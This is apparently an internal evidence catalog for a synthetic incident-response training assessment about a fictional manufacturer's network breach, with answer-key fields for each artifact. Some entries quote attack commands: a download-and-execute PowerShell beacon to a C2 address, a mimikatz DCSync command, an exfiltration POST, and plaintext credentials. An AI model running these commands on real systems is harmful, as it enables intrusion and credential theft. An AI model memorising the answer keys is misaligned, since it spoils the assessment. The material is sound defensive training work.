# EVIDENCE_CATALOG.md

**Vistara Polymers Incident — Evidence Catalog (Agent 3 deliverable)**
**Version:** 1.1 — Agent 3.5 consistency pass (2026-09-11) | **Source of truth:** ATTACK_TIMELINE.md v1.1, SCENARIO_BIBLE.md v1.1, ENVIRONMENT.md v1.1, V1_1_CHANGE_SPEC.md
**Timezone convention:** All timestamps IST (UTC+05:30). IIS artifacts (E-WEB-*) are emitted natively in **UTC** per ENVIRONMENT §12; each carries the canonical header line `# Synthetic training data. IIS timestamps are UTC. Convert to IST by adding +05:30.` UTC values shown in parentheses for those artifacts.
**Synthetic content:** All names, IPs, and organizations are fictional.
**Internal document note (CHG-05):** This catalog is an INTERNAL authoring document. Fields Relevance / Red herring / Expected significance / rule-out rationale map to internal_metadata and must never be rendered into candidate-visible artifacts; candidate_view fields per EVIDENCE_DIRECTORY_SPEC §4–5.

---

## How to read an entry
- **Relevance:** decisive (answer-defining) / corroborating (second independent source) / benign-noise / red-herring.
- **Red herring:** yes/no; if yes, the rule-out evidence a candidate can use.
- **Reveal phase (new in v1.1):** the simulation phase at which the artifact becomes visible to the candidate — Phase 0 (briefing), Phase 1 (investigation), Phase 6 (response execution), Phase 7 (validation/reporting).

---

## 1. Detection & Ticketing Artifacts

### E-ALERT-001
- **Type:** SIEM alert record (Wazuh) | **Source system:** SIEM-01 (10.10.40.11) | **Host referenced:** APP-PRD-01 (10.10.20.21)
- **Timestamp(s):** 2026-09-09 09:47 IST (alert fire)
- **Maps to:** EVT-031
- **Candidate-visible fields:** Alert ID `EDR-20260909-0417`; signature "Suspicious PowerShell encode + external connection"; host APP-PRD-01; process `powershell.exe -enc <base64>`; destination `185.220.101.47:8443`; parent = scheduled task `MicrosoftEdgeUpdateTaskMachineCore`; severity High.
- **Purpose:** Triggering alert; candidate entry point. | **Relevance:** decisive
- **Corroborates with:** E-ALERT-002, E-EDR-008, E-NET-003
- **Red herring:** No
- **Reveal phase:** 0 (briefing)
- **Expected significance:** Candidate validates a true incident (Sev-1 per IR-Policy-01), identifies APP-PRD-01 as the alerting host and 185.220.101.47 as C2.

### E-ALERT-002
- **Type:** SIEM correlation cluster view | **Source system:** SIEM-01 | **Hosts referenced:** FILE-PRD-01, DC-01, WEB-PRD-01, APP-PRD-01
- **Timestamp(s):** 2026-09-09 09:52 IST (correlation run); correlated events 2026-09-03 13:25 → 2026-09-05 13:05 IST
- **Maps to:** EVT-032
- **Candidate-visible fields:** Correlated items: 4624 Type 10 svc_mon FILE-PRD-01 from 10.10.20.21 (09-05 10:15); DC-01 4662 replication access by rajesh.kulkarni from 10.10.20.21 (09-04 13:10–13:14); outbound 8443 to 185.220.101.47 from 10.10.20.11 (09-03 13:25) and 10.10.20.23 (09-05 12:30). Escalated by SOC analyst Priya Nair 09:52.
- **Purpose:** Gives responder the correlated cluster; seeds scoping. | **Relevance:** decisive
- **Corroborates with:** E-ALERT-001, E-AUTH-006, E-AUTH-007, E-NET-002, E-NET-004
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Incident is wider than one host; candidate opens investigation on WEB-PRD-01, FILE-PRD-01, DC-01.

### E-TICKET-001
- **Type:** ServiceNow ticket INC-2026-0417 | **Source system:** ITSM | **Host referenced:** APP-PRD-01
- **Timestamp(s):** Created 2026-09-09 09:52 IST
- **Maps to:** EVT-031 (entry context)
- **Candidate-visible fields:** Ticket ID INC-2026-0417; caller SOC (Priya Nair); alert ref EDR-20260909-0417; asset APP-PRD-01; brief "encoded PowerShell beacon to external IP"; priority P1; assignment: IR analyst (candidate).
- **Purpose:** Phase-0 briefing artifact. | **Relevance:** corroborating
- **Corroborates with:** E-ALERT-001, E-ALERT-002
- **Red herring:** No (the "false positive" triage option is wrong; E-ALERT-002 cluster + E-EDR-008 disprove it)
- **Reveal phase:** 0 (briefing)
- **Expected significance:** Declare true incident; begin triage on APP-PRD-01.

---

## 2. Web / IIS Artifacts (WEB-PRD-01) — raw timestamps in UTC

All E-WEB-* artifacts carry the canonical header line (CHG-10, the only permitted variant):
`# Synthetic training data. IIS timestamps are UTC. Convert to IST by adding +05:30.`

### E-WEB-001
- **Type:** IIS access log excerpt | **Source system:** WEB-PRD-01 (203.0.113.10 / 10.10.20.11) | W3C logs, **UTC**
- **Timestamp(s):** 2026-09-02 09:01 UTC (= 14:31 IST, EVT-002 window)
- **Maps to:** EVT-002 (benign-web context during RDP banner grab)
- **Candidate-visible fields:** GET requests returning 404s on miscellaneous paths from assorted IPs; UptimeRobot health checks; Googlebot/Bingbot crawlers. No attacker-unique path.
- **Purpose:** Shows ambient web noise concurrent with EVT-002; demonstrates RDP activity leaves no web trace. | **Relevance:** benign-noise
- **Corroborates with:** E-NET-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Candidate learns web logs are quiet during the RDP recon — the perimeter log is the source for EVT-001/002.

### E-WEB-002
- **Type:** IIS access log excerpt | **Source system:** WEB-PRD-01 | **UTC**
- **Timestamp(s):** 2026-09-02 09:35–09:52 UTC (= 15:05–15:22 IST)
- **Maps to:** EVT-003
- **Candidate-visible fields:** Source `45.155.90.23`; UA `Mozilla/5.0 (compatible; Go-http-client/1.1)`; burst of 404s on guessed directories, then 200s on `/staging/`, `/staging/test/`, `/staging/test/upload.aspx`, `/staging/assets/`; GET-only, regular ~1 req/sec cadence.
- **Purpose:** Web reconnaissance of the staging tree. | **Relevance:** decisive (recon phase)
- **Corroborates with:** E-NET-001 (same source IP), E-WEB-003 (same IP returns for the upload)
- **Red herring:** No — distinguishable from scanner noise (RH-01/RH-07) by external IP, gobuster-style UA, and directory-guessing pattern.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Attacker discovered the staging upload page on 09-02; 45.155.90.23 is an attacker IOC.

### E-WEB-003
- **Type:** IIS access log excerpt | **Source system:** WEB-PRD-01 | **UTC**
- **Timestamp(s):** 2026-09-03 07:32 UTC POST (= 13:02 IST, EVT-008); 07:34+ UTC GETs (= 13:04+ IST, shell use)
- **Maps to:** EVT-008; shell callbacks corroborate persistence #3 (SCENARIO_BIBLE §19)
- **Candidate-visible fields:** `POST /staging/test/upload.aspx` from 45.155.90.23 → 200; subsequent `GET /staging/assets/upload_2024/img.aspx?cmd=<commands>` 200s; later shell hits continue through 09-08.
- **Purpose:** Web-shell deployment and use. | **Relevance:** decisive
- **Corroborates with:** E-FS-001 (file creation), E-WEB-002 (same source discovered the page)
- **Red herring:** No — must not be confused with RH-05 (`upload_bak.aspx`, different path, 2025 timestamp, no execution requests; see E-DOC-002, E-FS-007).
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Persistence mechanism #3 = web shell `img.aspx` at `C:\inetpub\wwwroot\staging\assets\upload_2024\`; weakness W-02b exploited.

### E-WEB-004
- **Type:** IIS access log excerpt (portal order API) | **Source system:** WEB-PRD-01 | **UTC**
- **Timestamp(s):** 2026-09-06 11:15–12:05 UTC (= 16:45–17:35 IST)
- **Maps to:** EVT-027 / RH-02
- **Candidate-visible fields:** Authenticated `POST /api/orders` calls by dealer accounts via pranav.joshi's session; normal order payloads matching dealer POs; source via VPN egress.
- **Purpose:** Red-herring traffic (odd-hour orders). | **Relevance:** red-herring
- **Corroborates with:** E-AUTH-010
- **Red herring:** YES (RH-02). Rule-out: VPN log ties session to Ahmedabad office IP 122.176.45.9; orders match legitimate dealer POs; no host compromise telemetry.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Odd-hour ≠ malicious; rule out with VPN log + order content.

---

## 3. Authentication / Windows Security Artifacts

### E-AUTH-001
- **Type:** Windows Security log excerpt (4625/4624; DC-01 4776) | **Source system:** WEB-PRD-01 (forwarded to SIEM-01); corroborating 4776 records on DC-01
- **Timestamp(s):** 2026-09-03 10:22–11:47 IST
- **Maps to:** EVT-004, EVT-005 (initial access); ambient failures also carry RH-07 noise
- **Candidate-visible fields:** 4625 bursts from source 45.155.90.23, LogonType 10, accounts administrator/admin/svc_portal/rajesh.kulkarni with distinct substatus codes (valid vs invalid user, EVT-004), 10:22–11:46; 4624 LogonType 10 success for `svc_portal` at 11:47, source 45.155.90.23; corroborating 4776 (NTLM credential validation) SUCCESS events on DC-01 for svc_portal from WEB-PRD-01 (10.10.20.11) in the same window. Scattered low-rate 4625s from random internet IPs with zero successes (RH-07).
- **Purpose:** RDP brute force + initial access success. | **Relevance:** decisive
- **Corroborates with:** E-NET-001 (scan), E-NET-005 (session), E-EDR-001 (post-logon behavior)
- **Red herring:** Contains RH-07 noise (random-IP failures — rule out by distributed sources, no successes, no follow-on).
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Initial access = RDP brute force of svc_portal (`Portal@2024`) over exposed 3389 at 2026-09-03 11:47 IST; WEB-PRD-01 is patient zero.

### E-AUTH-002
- **Type:** NTLM authentication failure record | **Source system:** APP-PRD-01 / SIEM-01
- **Timestamp(s):** 2026-09-03 15:12 IST
- **Maps to:** EVT-013 (attempt with old password RajKulk@2023); corroborates EVT-012 (that a credential was recovered and tried)
- **Candidate-visible fields:** NTLM logon attempt `rajesh.kulkarni` from WEB-PRD-01 (10.10.20.11) → APP-PRD-01; result: failed (bad password).
- **Purpose:** Shows old credential failed — attacker pivots. | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-003, E-EDR-004
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** rajesh.kulkarni's old password is dead; the attacker needs (and later obtains) the current one.

### E-AUTH-003
- **Type:** Windows Security 4625 | **Source system:** APP-PRD-01
- **Timestamp(s):** 2026-09-03 15:12 IST
- **Maps to:** EVT-013
- **Candidate-visible fields:** 4625 for rajesh.kulkarni, source 10.10.20.11, LogonType 3 (SMB/RPC attempt), substatus bad password.
- **Purpose:** Second record of the failed pivot. | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-002, E-EDR-004
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Confirms failed lateral movement attempt from WEB-PRD-01 — links WEB-PRD-01 compromise to interest in APP-PRD-01 one day before the successful pivot.

### E-AUTH-004
- **Type:** Windows Security 4624 | **Source system:** APP-PRD-01
- **Timestamp(s):** 2026-09-04 09:58 IST
- **Maps to:** EVT-015
- **Candidate-visible fields:** 4624 LogonType 10 (RDP), account `rajesh.kulkarni`, source 10.10.20.11 (WEB-PRD-01), workstation/Session on APP-PRD-01.
- **Purpose:** First successful lateral movement. | **Relevance:** decisive
- **Corroborates with:** E-EDR-006 (RDP session artifacts), E-FS-003 (source of the credential)
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Attacker moved WEB-PRD-01 → APP-PRD-01 using the password recovered from passwords.txt; valid-account lateral movement (T1021.001 + T1078).

### E-AUTH-005
- **Type:** LDAP bind/query log records | **Source system:** DC-01 (directory service log / SIEM)
- **Timestamp(s):** 2026-09-04 10:05–10:40 IST
- **Maps to:** EVT-016
- **Candidate-visible fields:** LDAP binds and queries from 10.10.20.21 (APP-PRD-01) as rajesh.kulkarni; group enumeration queries (Domain Admins, Enterprise Admins); DC locator traffic.
- **Purpose:** AD discovery corroboration (network side). | **Relevance:** corroborating
- **Corroborates with:** E-EDR-007 (command side)
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Attacker enumerated domain privilege structure from APP-PRD-01 and learned rajesh.kulkarni is a Domain Admin.

### E-AUTH-006
- **Type:** Windows Security 4662 (directory service access) | **Source system:** DC-01
- **Timestamp(s):** 2026-09-04 13:10–13:14 IST
- **Maps to:** EVT-019, EVT-020 (krbtgt captured in same operation)
- **Candidate-visible fields:** 4662 replication access (DRS GUIDs / Replicating Directory Changes All) by `rajesh.kulkarni`, source 10.10.20.21 (APP-PRD-01).
- **Purpose:** DCSync — full domain credential compromise. | **Relevance:** decisive
- **Corroborates with:** E-EDR-009 (mimikatz-style process), E-ALERT-002 (SIEM correlation)
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** All domain NTLM hashes + krbtgt captured; drives eradication (org-wide resets, double krbtgt reset) and scope (DC-01 credential disclosure).

### E-AUTH-007
- **Type:** Windows Security 4624 | **Source system:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 10:15 IST
- **Maps to:** EVT-021
- **Candidate-visible fields:** 4624 LogonType 10, account `svc_mon`, source 10.10.20.21 (APP-PRD-01).
- **Purpose:** Rogue account used for lateral movement to FILE-PRD-01. | **Relevance:** decisive
- **Corroborates with:** E-AD-001/002/003 (account is rogue), E-EDR-015 (session telemetry), E-SHARE-001 (subsequent SMB access)
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** svc_mon is attacker-controlled persistence and is active; FILE-PRD-01 is in scope.

### E-AUTH-008
- **Type:** Windows Security 4624 (network logon) | **Source system:** DB-PRD-01 (10.10.30.21)
- **Timestamp(s):** 2026-09-05 15:20 IST
- **Maps to:** EVT-025
- **Candidate-visible fields:** 4624 LogonType 3, account `rajesh.kulkarni` (Windows auth), source 10.10.20.23 (FILE-PRD-01).
- **Purpose:** Auth side of DB enumeration. | **Relevance:** corroborating
- **Corroborates with:** E-DB-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** DB-PRD-01 was accessed read-only — scoping judgment: accessed ≠ compromised.

### E-AUTH-009
- **Type:** Windows Security 4625 | **Source system:** ERP-APP-01 (10.10.20.22)
- **Timestamp(s):** 2026-09-06 09:33 IST
- **Maps to:** EVT-026
- **Candidate-visible fields:** Single failed SMB connect (4625) only, sourced from APP-PRD-01 during probe window; no successful logon follows.
- **Purpose:** ERP probed, not entered. | **Relevance:** corroborating
- **Corroborates with:** E-EDR-013
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** ERP-APP-01 is out of compromise scope; probe only.

### E-AUTH-010
- **Type:** VPN-GW-01 authentication log | **Source system:** VPN-GW-01 (203.0.113.12 / 10.10.20.13)
- **Timestamp(s):** 2026-09-06 16:45–17:35 IST
- **Maps to:** EVT-027 / RH-02
- **Candidate-visible fields:** SSL-VPN login `pranav.joshi` from 122.176.45.9 (Ahmedabad sales office IP); session duration matching order window.
- **Purpose:** Red-herring evidence (odd-hour sales work). | **Relevance:** red-herring
- **Corroborates with:** E-WEB-004, E-AUTH-012
- **Red herring:** YES (RH-02). Rule-out: known Ahmedabad office egress IP; orders match dealer POs; no endpoint alerts.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Benign traveling-user activity; exclude from attack path.

### E-AUTH-011
- **Type:** VPN + ERP logon records | **Source system:** VPN-GW-01 / ERP-APP-01
- **Timestamp(s):** 2026-09-07 11:20 IST (VPN); 11:26 IST (ERP 4624)
- **Maps to:** EVT-029 / RH-03
- **Candidate-visible fields:** VPN login `ananya.iyer` from Ahmedabad; subsequent ERP 4624, role-consistent finance transactions.
- **Purpose:** Red-herring evidence. | **Relevance:** red-herring
- **Corroborates with:** E-AUTH-012, E-DOC-003
- **Red herring:** YES (RH-03). Rule-out: HR-approved travel record TRV-2026-0312 (E-DOC-003); ERP activity role-consistent; no lateral movement.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Benign; exclude ananya.iyer from compromised accounts.

### E-AUTH-012
- **Type:** VPN-GW-01 log excerpt, full incident window | **Source system:** VPN-GW-01
- **Timestamp(s):** 2026-09-02 → 2026-09-09 IST (summary view)
- **Maps to:** RH-02, RH-03; negative evidence for attacker VPN use
- **Candidate-visible fields:** Complete VPN session list for the window: only pranav.joshi (09-06) and ananya.iyer (09-07) outside normal patterns; no logins from 45.155.90.23 or 185.220.101.47; no svc_* VPN logins.
- **Purpose:** Closes the "did they come in via VPN?" question (W-08 no-MFA is a noted weakness, not the vector); negative evidence for RH-02/RH-03 rule-out and initial-vector determination. | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-010, E-AUTH-011, E-DOC-003
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Initial access was RDP, not VPN; both odd VPN logins are the documented benign users.

---

## 4. EDR / Process Telemetry Artifacts ("SentinelNode")

### E-EDR-001
- **Type:** EDR process tree | **Host:** WEB-PRD-01
- **Timestamp(s):** 2026-09-03 11:47–12:20 IST
- **Maps to:** EVT-006
- **Candidate-visible fields:** `cmd.exe` (parent: termsvc/RDP session, user svc_portal) → `whoami`, `ipconfig /all`, `net user`, `quser`; synthetic hashes; session from 45.155.90.23.
- **Purpose:** Post-logon orientation. | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-001, E-NET-005
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Interactive human-driven session (not malware dropper); svc_portal session is attacker hands-on-keyboard.

### E-EDR-002
- **Type:** EDR process event | **Host:** WEB-PRD-01
- **Timestamp(s):** 2026-09-03 13:10 IST
- **Maps to:** EVT-009
- **Candidate-visible fields:** `powershell.exe Compress-Archive -Path C:\inetpub\wwwroot\staging -DestinationPath C:\ProgramData\Microsoft\Crypto\RSA\staging.zip`, user svc_portal.
- **Purpose:** Source-code staging. | **Relevance:** decisive (collection #1)
- **Corroborates with:** E-FS-002
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Portal source/config (connection strings, API keys) staged as staging.zip (~18 MB).

### E-EDR-003
- **Type:** EDR process events | **Host:** WEB-PRD-01
- **Timestamp(s):** 2026-09-03 14:40 IST
- **Maps to:** EVT-011
- **Candidate-visible fields:** `netstat -ano`, `tasklist`, `wmic process get ...`, `appcmd list apppool /config`; w3wp.exe running as svc_portal.
- **Purpose:** Host recon preceding credential theft. | **Relevance:** corroborating
- **Corroborates with:** E-EDR-004 (next step), E-EDR-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Attacker hunting credentials in config/memory.

### E-EDR-004
- **Type:** EDR process/memory-access event | **Host:** WEB-PRD-01
- **Timestamp(s):** 2026-09-03 15:05 IST
- **Maps to:** EVT-012
- **Candidate-visible fields:** Procdump-style dump of `w3wp.exe`; access to Credential Manager files; registry/LSA secret queries; user svc_portal.
- **Purpose:** Credential dumping (T1003); recovers RajKulk@2023 (old). | **Relevance:** decisive
- **Corroborates with:** E-AUTH-002/E-AUTH-003 (the failed use of the dumped password at 15:12)
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Credential theft on WEB-PRD-01; old password fails → attacker searches further.

### E-EDR-005
- **Type:** EDR process events | **Host:** WEB-PRD-01
- **Timestamp(s):** 2026-09-03 16:20 IST
- **Maps to:** EVT-014
- **Candidate-visible fields:** `type C:\IT\scripts\deploy.ps1`, `findstr /si "password" C:\Users\...`, read of `C:\Users\svc_portal\Documents\passwords.txt`.
- **Purpose:** Unsecured-credentials discovery (T1552); recovers RajKulk@2026. | **Relevance:** decisive
- **Corroborates with:** E-FS-003, E-WIKI-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Current password for rajesh.kulkarni obtained from passwords.txt (W-05); explains EVT-015 success.

### E-EDR-006
- **Type:** EDR session artifacts | **Host:** APP-PRD-01
- **Timestamp(s):** 2026-09-04 09:58 IST
- **Maps to:** EVT-015
- **Candidate-visible fields:** mstsc/rdpclip processes; RDP session source 10.10.20.11; user rajesh.kulkarni.
- **Purpose:** Lateral movement corroboration. | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-004
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Confirms interactive RDP pivot WEB-PRD-01 → APP-PRD-01.

### E-EDR-007
- **Type:** EDR process events | **Host:** APP-PRD-01
- **Timestamp(s):** 2026-09-04 10:05–10:40 IST
- **Maps to:** EVT-016
- **Candidate-visible fields:** `net group "Domain Admins" /domain`, `net group "Enterprise Admins" /domain`, `nltest /dclist:vistara.local`, `net view`, PowerShell ADSI/LDAP queries.
- **Purpose:** Discovery (T1087/T1069/T1018). | **Relevance:** decisive (discovery)
- **Corroborates with:** E-AUTH-005
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Attacker maps domain privileges; knows he holds Domain Admin (W-04).

### E-EDR-008
- **Type:** EDR process events | **Host:** APP-PRD-01
- **Timestamp(s):** 2026-09-04 11:30 IST (creation); first beacon 11:32 IST; recurring every 30 min
- **Maps to:** EVT-018; also the behavior behind EVT-031 detection
- **Candidate-visible fields:** `schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineCore" /RU SYSTEM ...`; action `powershell -enc <base64>`; decoded content references `https://185.220.101.47:8443/beacon`.
- **Purpose:** Persistence #2 + C2 (T1053.005, T1071.001). | **Relevance:** decisive
- **Corroborates with:** E-FS-004, E-NET-003, E-ALERT-001, E-EDR-008B
- **Red herring:** No — task name mimics legitimate Edge update; rule-in via command line + destination, not name.
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Host persistence + active C2 channel on APP-PRD-01; this is what the EDR alert fired on.

### E-EDR-008B
- **Type:** PowerShell Operational log record (Event 4104 script-block) | **Host:** APP-PRD-01
- **Timestamp(s):** 2026-09-04 11:32 IST
- **Maps to:** EVT-018
- **Candidate-visible fields:** Event 4104 script-block record of the encoded beacon executed by the scheduled task (user SYSTEM); drill-down comment shows the decoded `IEX (New-Object Net.WebClient).DownloadString('https://185.220.101.47:8443/beacon')`.
- **Purpose:** Second independent source for the beacon payload content (with E-EDR-008/E-FS-004/E-NET-003). | **Relevance:** corroborating
- **Corroborates with:** E-EDR-008, E-FS-004, E-NET-003
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Candidate can decode the beacon payload from an independent log source; C2 URL confirmed without relying solely on EDR decoding.

### E-EDR-009
- **Type:** EDR process event | **Host:** DC-01 (session from APP-PRD-01)
- **Timestamp(s):** 2026-09-04 13:10–13:14 IST
- **Maps to:** EVT-019, EVT-020
- **Candidate-visible fields:** mimikatz-style process; command line explicitly includes `lsadump::dcsync /domain:vistara.local /all` (the /all scope is what makes krbtgt capture deterministically inferable for EVT-020); run in rajesh.kulkarni RDP session.
- **Purpose:** DCSync corroboration (endpoint side). | **Relevance:** decisive
- **Corroborates with:** E-AUTH-006
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Domain credential dump incl. krbtgt; mandates double krbtgt reset in eradication.

### E-EDR-010
- **Type:** EDR process events | **Host:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 10:20–11:45 IST
- **Maps to:** EVT-022
- **Candidate-visible fields:** `dir /s *.dwg *.xlsx *.pdf *payroll* *salary*`; robocopy/copy commands into `C:\Windows\Temp\collect\`; user svc_mon.
- **Purpose:** Collection (T1005/T1039). | **Relevance:** decisive
- **Corroborates with:** E-FS-005, E-SHARE-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** ~2.1 GB staged: client designs (S:\Clients), spec sheets, payroll_aug2026.xlsx (R:\HR), finance summaries (R:\Finance).

### E-EDR-011
- **Type:** EDR process event | **Host:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 12:05 IST
- **Maps to:** EVT-023
- **Candidate-visible fields:** `powershell Compress-Archive C:\Windows\Temp\collect\* → C:\Windows\Temp\order_export_2026.zip` (~680 MB), user svc_mon.
- **Purpose:** Archive staging (T1560.001). | **Relevance:** decisive
- **Corroborates with:** E-FS-006
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Exfil package prepared; archive name is an IOC.

### E-EDR-012
- **Type:** EDR process/network event | **Host:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 12:30–13:05 IST
- **Maps to:** EVT-024
- **Candidate-visible fields:** `powershell Invoke-WebRequest`/curl-style POST to `https://185.220.101.47:8443/upload` (chunked); source process ties to svc_mon session.
- **Purpose:** Exfiltration #2 (T1041/T1567). | **Relevance:** decisive
- **Corroborates with:** E-NET-004
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** ~680 MB exfiltrated to attacker VPS; FILE-PRD-01 is exfil origin.

### E-EDR-013
- **Type:** EDR process events | **Host:** APP-PRD-01
- **Timestamp(s):** 2026-09-06 09:30–09:33 IST
- **Maps to:** EVT-026
- **Candidate-visible fields:** `wmic /node:... net localgroup administrators`, `net use \\ERP-APP-01` probe attempts; user svc_mon.
- **Purpose:** ERP probing, abandoned. | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-009
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** ERP-APP-01 probed only; exclude from compromise scope.

### E-EDR-014
- **Type:** EDR process events | **Host:** APP-PRD-01
- **Timestamp(s):** 2026-09-08 10:05 IST
- **Maps to:** EVT-030
- **Candidate-visible fields:** `Clear-History`; deletion of `ConsoleHost_history.txt`; recycle-bin emptying; user svc_mon.
- **Purpose:** Anti-forensics (T1070). | **Relevance:** corroborating
- **Corroborates with:** SIEM-retained copies (E-ALERT-002 cluster still complete), E-EDR-008
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Cleanup partial; SIEM/EDR retention defeats it — a logging-strength lesson.

### E-EDR-015
- **Type:** EDR logon/session telemetry | **Host:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 10:15 IST (session start) through 13:05 IST
- **Maps to:** EVT-021 (session corroboration), EVT-022/023/024 (session continuity)
- **Candidate-visible fields:** RDP session ID for svc_mon from 10.10.20.21; session active across collection/archive/exfil window; logoff after exfil.
- **Purpose:** Second independent source for EVT-021 (key lateral-movement event holds ≥2-source coverage per SIMULATION_REQUIREMENTS §15). | **Relevance:** corroborating
- **Corroborates with:** E-AUTH-007, E-EDR-010, E-EDR-011, E-EDR-012
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** svc_mon session on FILE-PRD-01 spans the entire collection→exfil window.

---

## 5. File System Artifacts

### E-FS-001
- **Type:** File creation event | **Host:** WEB-PRD-01
- **Timestamp(s):** 2026-09-03 13:02 IST
- **Maps to:** EVT-008
- **Candidate-visible fields:** Created `C:\inetpub\wwwroot\staging\assets\upload_2024\img.aspx`; writer process w3wp.exe (upload page); small ASPX cmd-eval content.
- **Purpose:** Web-shell artifact (persistence #3). | **Relevance:** decisive
- **Corroborates with:** E-WEB-003
- **Red herring:** No — distinct from RH-05 (`...\assets\old\upload_bak.aspx`, 2025-11-08 timestamp, quarantined per E-DOC-002 / E-FS-007).
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Identify shell path for eradication (EVT-035 step 2).

### E-FS-002
- **Type:** File creation event | **Host:** WEB-PRD-01
- **Timestamp(s):** 2026-09-03 13:10 IST
- **Maps to:** EVT-009
- **Candidate-visible fields:** `C:\ProgramData\Microsoft\Crypto\RSA\staging.zip` (~18 MB) created; masquerading path under a system-looking directory.
- **Purpose:** Staged source archive. | **Relevance:** corroborating
- **Corroborates with:** E-EDR-002, E-NET-002
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Staging + exfil of portal source/config on 09-03; artifact to delete in eradication step 3.

### E-FS-003
- **Type:** File metadata + content excerpt | **Host:** WEB-PRD-01
- **Timestamp(s):** File last written 2026-07 (maintenance session); read 2026-09-03 16:20 IST
- **Maps to:** EVT-014
- **Candidate-visible fields:** `C:\Users\svc_portal\Documents\passwords.txt`; contents: `svc_portal:Portal@2024`, `rajesh.kulkarni:RajKulk@2026`; legacy 2024 vendor file, re-saved 2026-07.
- **Purpose:** Pivot credential source (T1552, W-05). | **Relevance:** decisive
- **Corroborates with:** E-EDR-005, E-WIKI-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Root of the pivot: plaintext credential file; also confirms svc_portal password documented in wiki.

### E-FS-004
- **Type:** Scheduled task XML export | **Host:** APP-PRD-01
- **Timestamp(s):** Registered 2026-09-04 11:30 IST
- **Maps to:** EVT-018
- **Candidate-visible fields:** Task `MicrosoftEdgeUpdateTaskMachineCore`; runs as SYSTEM; every 30 min; action `powershell -enc <base64>`; author rajesh.kulkarni session.
- **Purpose:** Persistence #2 artifact. | **Relevance:** decisive
- **Corroborates with:** E-EDR-008, E-NET-003
- **Red herring:** No (name impersonates a real Edge task — candidate must read the action, not the name).
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Task must be deleted (eradication step 1); validates the detection alert.

### E-FS-005
- **Type:** File access/copy events | **Host:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 10:20–11:45 IST
- **Maps to:** EVT-022
- **Candidate-visible fields:** `C:\Windows\Temp\collect\` created 10:20; bulk reads from `S:\Clients\`, spec-sheet dirs, `R:\HR\payroll_aug2026.xlsx`, `R:\Finance\`; ~2.1 GB written to collect dir.
- **Purpose:** Collection file-side record. | **Relevance:** decisive
- **Corroborates with:** E-EDR-010, E-SHARE-001
- **Red herring:** No
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Data categories staged: client designs/specs, payroll (PII), finance summaries.

### E-FS-006
- **Type:** File creation event | **Host:** FILE-PRD-01
- **Timestamp(s):** 2026-09-05 12:05 IST
- **Maps to:** EVT-023
- **Candidate-visible fields:** `C:\Windows\Temp\order_export_2026.zip` created (~680 MB); benign-looking name.
- **Purpose:** Exfil package artifact. | **Relevance:** corroborating
- **Corroborates with:** E-EDR-011, E-NET-004
- **Red herring:** No (name designed to look like a business export; size + path + timing rule it in).
- **Reveal phase:** 1 (investigation)
- **Expected significance:** Archive name/size = IOC; matches the 680 MB FW flow at 12:30–13:05.

### E-FS-007
- **Type:** File metadata record (JSON export) | **Host:** WEB-PRD-01
- **Timestamp(s):** File created/quarantined 2025-11-08; metadata exported during investigation (2026-09-09)
- **Maps to:** RH-05 (red-herring context surface)
- **Candidate-visible fields:** Metadata for `C:\inetpub\wwwroot\assets\old\upload_bak.aspx`: created 2025-11-08; quarantine flag set per the 2025 IR note (see E-DOC-002); no 2026 execution or access records.
